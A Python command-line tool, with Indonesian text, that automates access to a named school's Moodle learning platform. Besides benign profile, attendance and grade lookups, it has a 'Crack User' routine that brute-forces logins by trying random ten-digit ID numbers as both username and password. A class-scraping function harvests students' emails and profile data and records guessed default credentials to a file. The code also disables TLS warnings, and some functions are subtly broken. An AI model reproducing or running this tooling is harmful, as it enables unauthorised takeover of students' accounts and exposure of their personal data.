
import requests,random
import time
import re,os,json
from bs4 import BeautifulSoup
from rich import print as prints
from rich.panel import Panel
from rich.table import Table as me
from rich.tree import Tree
import urllib3
import certifi
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from rich.console import Console as sol,Console
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn, SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.columns import Columns as col, Columns


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
console = Console()
session = requests.Session()
Meledakcik=[]


def check_token_cookie():
    try:
        token = open('.token.txt', 'r').read().strip()
        cookie = open('.cookie.txt', 'r').read().strip()
        # Pastikan token dan cookie valid
        session.cookies.update({key: value for key, value in (item.split('=') for item in cookie.split('; '))})
        response = session.get("https://lms.smkn4padalarang.sch.id/my/", verify=False)
        if "Dashboard" in response.text:
            prints(Panel.fit("[bold green]Token dan cookie valid, langsung masuk ke menu!"))
            menu()
            return True
    except (IOError, ValueError, Exception):
        prints(Panel.fit("[bold red]Token atau cookie tidak valid. Silakan login."))
        return False


def login():
    try:
        print('')
        idf = input("+_ Masukan username : ")
        pas = input("+_ Masukan password : ")
        time.sleep(1)

        p = session.get("https://lms.smkn4padalarang.sch.id/login/index.php", verify=False)
        logintoken_match = re.search('name="logintoken" value="(.*?)"', str(p.text))
        
        if not logintoken_match:
            prints(Panel.fit("[bold red]Gagal mendapatkan logintoken, silakan coba lagi!"))
            return
        logintoken = logintoken_match.group(1)
        with open(".token.txt", "w") as file:
                file.write(logintoken)
        heade = {
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Host': 'lms.smkn4padalarang.sch.id',
            'Referer': 'https://lms.smkn4padalarang.sch.id/',
            'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        }
        data = {
            "logintoken": logintoken,
            "username": idf,
            "password": pas
        }
        response = session.post(
            "https://lms.smkn4padalarang.sch.id/login/index.php",
            headers=heade,
            data=data,
            allow_redirects=True,
            verify=False
        )

        if 'Dashboard' in response.text:
            cookies = "; ".join([
                f"{key}={value}"
                for key, value in session.cookies.get_dict().items()
            ])

            with open(".cookie.txt", "w") as file:
                file.write(cookies)

            # Output keberhasilan
            Meledak = Tree(Panel.fit("[bold green]Log in Success"))
            Meledak.add(Panel.fit(f"[bold green]Username: {idf}, Password: {pas}"))
            Meledak.add(Panel.fit(f"[bold green]Cookies tersimpan: {cookies}"))
            prints(Meledak)
            menu()
        else:
            prints(Panel.fit("[bold red]Username atau password salah, coba lagi!"))
    except Exception as e:
        prints(Panel.fit(f"[bold red]Terjadi kesalahan: {str(e)}"))


def menu():
    os.system("clear")
    try:
        token = open('.token.txt', 'r').read().strip()
        cookie = open('.cookie.txt', 'r').read().strip()
    except IOError:
        prints(Panel.fit("[bold red]Token atau cookie tidak ditemukan. Silakan login ulang!"))
        return
    session = requests.Session()
    session.cookies.update({key: value for key, value in (item.split('=') for item in cookie.split('; '))})
    url = "https://lms.smkn4padalarang.sch.id/my/"
    response = session.get(url, verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_element = soup.find('span', class_='usertext')
    if user_element:
        user_name = user_element.text.strip()
    else:
        user_name = "Pengguna Tidak Diketahui"
        
    urlvalue = "https://lms.smkn4padalarang.sch.id/user/edit.php"
    response_2 = session.get(urlvalue, verify=False)
    soup_2 = BeautifulSoup(response_2.text, 'html.parser')
    user_element_2 = soup_2.find('input', {'id': 'id_profile_field_NIK'})
    if user_element_2 and 'value' in user_element_2.attrs:
        user_name_2 = user_element_2['value'].strip()  # Mengambil value dari atribut
    else:
        user_name_2 = "Pengguna Tidak Diketahui"
    Meledakcik.append(Panel(f"[bold green]Nama : [bold white]{user_name}\n[bold green]User NIK : [bold white]{user_name_2}",width=50,style=f"bold green"))
    console.print(Columns(Meledakcik))
    Tabel1 = f"[bold white]01\n02\n03\n04\n05\n06\n07\n08\n09\n00"
    Tabel2 = f"Cek Profile\nEdit Profile\nCek Kehadiran\nCek Kelas\nCek Report\nChange Password\nAutomatic Absen\nCrack User\nCrack File User\nExit"
    Tabel3 = f"[bold blue]ON\nON\nON\nON\nON\nON\nON\nON\nON\n[bold red]ON"
    cik = me()
    cik.add_column(f"[bold white]NO", style="bold green", justify='center')
    cik.add_column(f"[bold white]PILIHAN", style="bold green", justify='left',width=40)
    cik.add_column(f"[bold white]STATUS", style="bold green", justify='center')
    cik.add_row(Tabel1,Tabel2,Tabel3)
    sol().print(cik, justify='left',style=f"bold green")
    i = input(f"Pilih Menu : ")
    if i == "1":
        profile()
    elif i == "2":
        prints(Panel.fit(f"[bold red]Maaf Menu ini cooming soon karena tahap perbaikan[bold white]"))
    elif i == "3":
        kehadiran()
    elif i == "4":
        kelas()
    elif i == "5":
        report()
    elif i == "6":
        autochangepas()
    elif i == "7":
        absensi()
    elif i == "8":
        crack()
    elif i == "9":
        os.system("python3 crack.py")
    elif i == "0":
        exit()
        
def profile():
    prints(Panel.fit("👨‍🎓 [bold green]Memeriksa Isi Data Profile[/bold green]"))
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cookie.txt', 'r').read()
    except IOError:
        prints(Panel.fit("[bold red]Token atau cookie tidak ditemukan. Silakan login ulang!"))
        return
    try:
        response = session.get("https://lms.smkn4padalarang.sch.id/user/profile.php", verify=False)
        soup = BeautifulSoup(response.text, "html.parser")
        profile_data = {}
        for item in soup.find_all("li", class_="contentnode"):
            dt = item.find("dt")
            dd = item.find("dd")
            if dt and dd:
                key = dt.text.strip()
                value = dd.text.strip() if not dd.find("a") else dd.find("a").text.strip()
                profile_data[key] = value
        ProfileTree = Tree(Panel.fit("[bold cyan]Data Profil Pengguna"))
        for key, value in profile_data.items():
            ProfileTree.add(f"[bold white]{key}: [green]{value}")
        prints(ProfileTree)
    except Exception as e:
        prints(Panel.fit(f"[bold red]Terjadi kesalahan saat mengambil data profil: {str(e)}"))
        

def editProfile():
    prints(Panel.fit("👨‍🎓 [bold green]Perubahan Edit Profile[/bold green]"))
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cookie.txt', 'r').read()
    except IOError:
        prints(Panel.fit("[bold red]Token atau cookie tidak ditemukan. Silakan login ulang!"))
        return
    try:
        data = {
            "course": "1",
            "id": "228",
            "returnto": "profile",
            "sesskey": form.find("input", {"name": "sesskey"})["value"],
            "_qf__user_edit_form": "1",
            "mform_isexpanded_id_moodle": "1",
            "mform_isexpanded_id_moodle_picture": "1",
            "mform_isexpanded_id_category_2": "1",
            "submitbutton": "Update profile"  # Menambahkan submitbutton sebagai bagian dari data POST
        }
        headers = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Cookie": cok,
            "Host": "lms.smkn4padalarang.sch.id",
            "Referer": "https://lms.smkn4padalarang.sch.id/user/profile.php?id=228",
            "Sec-CH-UA": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"macOS"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
        response = session.get("https://lms.smkn4padalarang.sch.id/user/edit.php",data=data, headers=headers, verify=False)
        if response.status_code != 200:
            prints(Panel.fit("[bold red]Gagal mengakses halaman edit profil."))
            return
        soup = BeautifulSoup(response.text, "html.parser")
        form = soup.find("form", {"id": "mform1_CnEhT0DDoaCTpk7"})
        if not form:
            prints(Panel.fit("[bold red]Form edit profil tidak ditemukan."))
            return
        for input_tag in form.find_all("input"):
            name = input_tag.get("name")
            value = input_tag.get("value", "")
            if name and name not in data:
                data[name] = value
        
        maildisplay = form.find("select", {"name": "maildisplay"})
        if maildisplay:
            maildisplay_value = maildisplay.get("data-initial-value", "2")
            maildisplay_choice = input(f"Ubah Email Visibility (0: Hidden, 1: Visible to everyone, 2: Visible to course participants) [default: {maildisplay_value}]: ") or maildisplay_value
            data["maildisplay"] = maildisplay_choice
        
        city_input = form.find("input", {"name": "city"})
        if city_input:
            city_value = city_input.get("value", "Bandung Barat")
            city_new_value = input(f"Ubah City/Town [default: {city_value}]: ") or city_value
            data["city"] = city_new_value
        
        nik_input = form.find("input", {"name": "profile_field_NIK"})
        if nik_input:
            nik_value = nik_input.get("value", "0076497918")
            nik_new_value = input(f"Ubah Nomor Induk Kependudukan (NIK) [default: {nik_value}]: ") or nik_value
            data["profile_field_NIK"] = nik_new_value

        prints(Panel.fit("[bold cyan]Edit Profil"))
        for key, value in data.items():
            if key not in ["sesskey", "_qf__user_edit_form", "submitbutton"]:  # Abaikan field khusus
                new_value = input(f"Ubah {key} [default: {value}]: ") or value
                data[key] = new_value
        
        edit_url = form.get("action")
        
        response = session.post(edit_url, headers=headers, data=data, verify=False)
        if response.status_code == 200 and "Profil berhasil diperbarui" in response.text:
            prints(Panel.fit("[bold green]Profil berhasil diperbarui!"))
        else:
            prints(Panel.fit("[bold red]Gagal memperbarui profil. Periksa data dan coba lagi."))
    
    except Exception as e:
        prints(Panel.fit(f"[bold red]Terjadi kesalahan saat mengedit profil: {str(e)}"))


def kehadiran():
    prints(Panel.fit("👨‍🎓 [bold green]Memeriksa Kehadiran[/bold green]"))
    try:
        token = open('.token.txt', 'r').read().strip()
        cookie = open('.cookie.txt', 'r').read().strip()
    except IOError:
        prints(Panel.fit("[bold red]Token atau cookie tidak ditemukan. Silakan login ulang!"))
        return
    try:
        session = requests.Session()
        headers = {
            "Authorization": f"Bearer {token}",
            "Cookie": cookie,
        }
        url = "https://lms.smkn4padalarang.sch.id/mod/attendance/view.php?id=990"
        response = session.get(url, headers=headers, verify=False)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        rows = soup.select("table.generaltable tbody tr")
        if not rows:
            prints(Panel.fit("[bold red]Tidak ada data kehadiran yang ditemukan![/bold red]"))
            return
        prints(Panel.fit("[bold blue]Data Kehadiran[/bold blue]"))
        for row in rows:
            date = row.select_one(".datecol").get_text(strip=True)
            description = row.select_one(".desccol").get_text(strip=True)
            status = row.select_one(".statuscol").get_text(strip=True)
            points = row.select_one(".pointscol").get_text(strip=True)
            remarks = row.select_one(".remarkscol").get_text(strip=True)
            prints(Panel.fit(f"[bold cyan]{date}[/bold cyan] - {description}\n  [green]Status:[/green] {status} | [yellow]Poin:[/yellow] {points} | [blue]Catatan:[/blue] {remarks}[bold white]"))
            prints("")

    except Exception as e:
        prints(Panel.fit(f"[bold red]Terjadi kesalahan: {str(e)}[/bold red]"))


def kelas():
    console.print(Panel.fit("👨‍🎓 [bold green]Mengecek Data Kelas Beserta Profilnya[/bold green]"))
    print("")
    try:
        token = open('.token.txt', 'r').read().strip()
        cookie = open('.cookie.txt', 'r').read().strip()
    except IOError:
        console.print(Panel.fit("[bold red]Token atau cookie tidak ditemukan. Silakan login ulang!"))
        return
    headers = {
        "Authorization": f"Bearer {token}",
        "Cookie": cookie,
    }

    url = "https://lms.smkn4padalarang.sch.id/user/index.php?id=33&perpage=5000"
    response = session.get(url, headers=headers, verify=False)
    
    if response.status_code != 200:
        console.print(Panel.fit(f"[bold red]Gagal mengambil data kelas. HTTP Status: {response.status_code}"))
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    participants = soup.find_all('th', class_='cell c1')
    names_and_links = []
    
    for participant in participants:
        a_tag = participant.find('a', href=True)
        if a_tag:
            name = a_tag.text.strip()
            link = a_tag['href']
            names_and_links.append((name, link))
    
    if names_and_links:
        for idx, (name, link) in enumerate(names_and_links, start=1):
            try:
                print("")
                print("")
                prints(Panel.fit(f"[bold green]Peserta ke {idx}[bold white]"))
                console.print(Panel.fit(f"[bold white]Peserta : [bold blue]{name}\n[bold white]Link: [bold blue]{link}"))
                
                profile_url = link
                profile_response = session.get(profile_url, headers=headers, verify=False)
                
                if profile_response.status_code != 200:
                    console.print(Panel.fit(f"[bold yellow]Gagal mengambil profil: {profile_url}"))
                    continue
                
                profile_soup = BeautifulSoup(profile_response.text, "html.parser")
                profile_data = {}
                
                for item in profile_soup.find_all("li", class_="contentnode"):
                    dt = item.find("dt")
                    dd = item.find("dd")
                    if dt and dd:
                        key = dt.text.strip()
                        value = dd.text.strip() if not dd.find("a") else dd.find("a").text.strip()
                        profile_data[key] = value

                email = profile_data.get("Email address")
                username = email.split('@')[0]
                tree = Tree(Panel.fit(f"[bold green]Data Akun Peserta[/bold green]"))
                tree.add(Panel.fit(f"[bold white]Username: [blue]{username}"))
                tree.add(Panel.fit(f"[bold white]Password: [blue]{username}"))
                console.print(tree)
                data_to_write = {
                    "username": username,
                    "password": username,
                    "nama": name,
                    "link": link
                }
                try:
                    with open("user/data.json", "r") as file:
                        existing_data = json.load(file)
                except (FileNotFoundError, json.JSONDecodeError):
                    existing_data = []
                existing_data.append(data_to_write)
                with open("user/data.json", "w") as file:
                    json.dump(existing_data, file, indent=4)
                profile_tree = Tree(Panel.fit("[bold cyan]Data Profil Pengguna"))
                for key, value in profile_data.items():
                    profile_tree.add(f"[bold white]{key}: [green]{value}")
                console.print(profile_tree)
            except Exception as e:
                console.print(Panel.fit(f"[bold red]Terjadi kesalahan: {e}"))
    else:
        console.print(Panel.fit("[bold yellow]Tidak ada peserta ditemukan!"))


def report():
    console.print(Panel.fit("👨‍🎓 [bold green]Mengecek Data Kelas Beserta Profilnya[/bold green]"))
    print("")
    try:
        token = open('.token.txt', 'r').read().strip()
        cookie = open('.cookie.txt', 'r').read().strip()
    except IOError:
        console.print(Panel.fit("[bold red]Token atau cookie tidak ditemukan. Silakan login ulang!"))
        return
    headers = {
        "Authorization": f"Bearer {token}",
        "Cookie": cookie,
    }

    url = "https://lms.smkn4padalarang.sch.id/grade/report/user/index.php?id=34"
    response = session.get(url, headers=headers, verify=False)
    
    if response.status_code != 200:
        console.print(Panel.fit(f"[bold red]Gagal mengambil data report. HTTP Status: {response.status_code}"))
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    reportdata = soup.find_all('tr', class_='cat_33 lastrow')
    for row in reportdata:
        course_total = row.find('div', class_='rowtitle').text.strip()
        grade = row.find('td', class_='column-grade').text.strip()
        percentage = row.find('td', class_='column-percentage').text.strip()
        range_value = row.find('td', class_='column-range').text.strip()

        tree = Tree(Panel.fit(f"[bold green]Data Report Akun[/bold green]"))
        tree.add(Panel.fit(f"[bold white][blue]{course_total}"))
        tree.add(Panel.fit(f"[bold white]Grade: [blue]{grade}"))
        tree.add(Panel.fit(f"[bold white]Percentage: [blue]{percentage}"))
        tree.add(Panel.fit(f"[bold white]Range: [blue]{range_value}"))
        console.print(tree)
        
        
def absensi():
    username = input("+ Masukan username : ")
    password = input("+ Masukan password : ")
    try:
        driver = webdriver.Chrome()  # or webdriver.Firefox(), etc.
        driver.get("https://lms.smkn4padalarang.sch.id/login/index.php")
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'logintoken')))
        logintoken_element = driver.find_element(By.NAME, 'logintoken')
        logintoken = logintoken_element.get_attribute("value")
        if not logintoken:
            print("Gagal mendapatkan logintoken, silakan coba lagi!")
            driver.quit()
            return
        username_input = driver.find_element(By.ID, "username")
        password_input = driver.find_element(By.ID, "password")
        username_input.send_keys(username)
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, 'Dashboard')))
        print(f"Log in Success")
        print(f"Username: {username}, Password: {password}")
        driver.get("https://lms.smkn4padalarang.sch.id/mod/attendance/view.php?id=990")
        element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.LINK_TEXT, "Submit attendance"))
        )
        driver.execute_script("arguments[0].scrollIntoView(true);", element)
        element.click()
        time.sleep(4)
        print("Attendance page loaded successfully")
        try:
            status_116 = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.ID, "id_status_116"))
            )
            status_116.click()
        except:
            try:
                status_118 = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.ID, "id_status_118"))
                )
                status_118.click()
            except:
                print("No valid options found, no changes saved.")
        save_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "id_submitbutton"))
        )
        save_button.click()
        print("Form submitted successfully.")
        driver.quit()
    except Exception as e:
        print(f"Terjadi kesalahan: {str(e)}")

def autochangepas():
    username = input("+ Masukan username : ")
    password = input("+ Masukan password : ")
    try:
        driver = webdriver.Chrome()  # or webdriver.Firefox(), etc.
        driver.get("https://lms.smkn4padalarang.sch.id/login/index.php")
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'logintoken')))
        logintoken_element = driver.find_element(By.NAME, 'logintoken')
        logintoken = logintoken_element.get_attribute("value")
        if not logintoken:
            print("Gagal mendapatkan logintoken, silakan coba lagi!")
            driver.quit()
            return
        username_input = driver.find_element(By.ID, "username")
        password_input = driver.find_element(By.ID, "password")
        username_input.send_keys(username)
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, 'Dashboard')))
        print(f"Log in Success")
        print(f"Username: {username}, Password: {password}")
        password_new = input("+ Masukan password baru : ")
        password_new_again = input("+ Ulangi password yang baru : ")
        try:
            driver.get("https://lms.smkn4padalarang.sch.id/login/change_password.php?id=1")
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'id_password')))
            current_password_input = driver.find_element(By.ID, "id_password")
            new_password1_input = driver.find_element(By.ID, "id_newpassword1")
            new_password2_input = driver.find_element(By.ID, "id_newpassword2")
            current_password_input.send_keys(password)
            new_password1_input.send_keys(password_new)
            new_password2_input.send_keys(password_new_again)
            new_password2_input.send_keys(Keys.RETURN)
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "submitbutton")))
            print(f"change pass done")
            print(f"Username: {username}, Password: {new_password1_input}")
        except Exception as e:
            print(f"Terjadi kesalahan saat mengubah password: {str(e)}")
        driver.quit()
    except Exception as e:
        print(f"Terjadi kesalahan: {str(e)}")

def generat():
    random_number = random.randint(10000000, 100000000 - 1)
    formatted_number = f"{random_number:010d}"
    return formatted_number

def crack():
    while True:
        try:
            print('')
            idf = generat()
            time.sleep(1)
            p = session.get("https://lms.smkn4padalarang.sch.id/login/index.php", verify=False)
            logintoken_match = re.search('name="logintoken" value="(.*?)"', str(p.text))
            
            if not logintoken_match:
                prints(Panel.fit("[bold red]Gagal mendapatkan logintoken, silakan coba lagi!"))
                return
            logintoken = logintoken_match.group(1)
            heade = {
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Host': 'lms.smkn4padalarang.sch.id',
                'Referer': 'https://lms.smkn4padalarang.sch.id/',
                'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
            }
            data = {
                "logintoken": logintoken,
                "username": idf,
                "password": idf
            }
            response = session.post(
                "https://lms.smkn4padalarang.sch.id/login/index.php",
                headers=heade,
                data=data,
                allow_redirects=True,
                verify=False
            )

            if 'Dashboard' in response.text:
                cookies = "; ".join([
                    f"{key}={value}"
                    for key, value in session.cookies.get_dict().items()
                ])
                # Output keberhasilan
                Meledak = Tree(Panel.fit("[bold green]Log in Success"))
                Meledak.add(Panel.fit(f"[bold green]Username: {idf}, Password: {idf}"))
                Meledak.add(Panel.fit(f"[bold green]Cookies tersimpan: {cookies}"))
                try:
                    session.cookies.update({key: value for key, value in (item.split('=') for item in cookie.split('; '))})
                    url = "https://lms.smkn4padalarang.sch.id/my/"
                    response = session.get(url, verify=False)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    user_element = soup.find('span', class_='usertext')
                    if user_element:
                        user_name = user_element.text.strip()
                    else:
                        user_name = "Pengguna Tidak Diketahui"
                except IOError :
                    prints(Panel.fit(f"Pengguna tidak diketahui"))
                Meledak.add(Panel.fit(f"[bold green]User Pengguna: {user_name}"))
                prints(Meledak)
                open('data-success.txt','a').write(idf+"|"+idf+"\n")
                break  # Exit loop if login is successful
            else:
                prints(Panel.fit(f"[bold red]Username {idf} atau password {idf} salah, coba lagi!"))
                open('data-fail.txt','a').write(idf+"|"+idf+"\n")
        except Exception as e:
            prints(Panel.fit(f"[bold red]Terjadi kesalahan: {str(e)}"))

if __name__ == "__main__":
    os.system("clear")
    if not check_token_cookie():
        login()



